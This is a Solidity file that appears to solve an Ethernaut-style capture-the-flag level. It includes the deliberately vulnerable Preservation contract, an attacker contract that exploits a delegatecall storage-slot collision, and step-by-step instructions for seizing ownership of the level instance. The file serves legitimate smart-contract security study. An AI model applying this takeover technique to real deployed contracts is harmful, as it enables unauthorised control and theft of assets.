// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) public {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

contract AttackPreservation {
    // overriding the Preservation contract's timeZone1Library's address to our own address
    // and then overriding the setTime() function with our own malicious one to set owner of the Preservation contract
    address public timeZone1Library; // SLOT 0
    address public timeZone2Library; // SLOT 1
    address public owner; // SLOT 2

    // Note: it is important to use the same function name as in LibraryContract
    //because Preservation.sol invokes functions by name: bytes4(keccak256("setTime(uint256)"))

    // delegatecall to this function to modify state stored in slot 2 in the calling contract
    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}

/* STEPS TO FOLLOW
1. deploy the AttackPreservation contract on Remix
2. get the AttackPreservation contract address e.g. 0xab0d8b6B5C7C95748b156504AC85874Ff695Da04
3. convert the AttackPreservation contract address from address to uint by padding left the address to 64 character hex e.g. 0x000000000000000000000000ab0d8b6B5C7C95748b156504AC85874Ff695Da04
4. load the level instance contract on Remix
5. run setFirstTime() function with the input of the padded AttackPreservation contract address
6. confirm that timeZone1Library is set to the AttackPreservation contract address
7. run setFirstTime() function with any arbituary input and it should execute the malicious function of `owner = msg.sender;`
8. owner should be set to the attacker's address
*/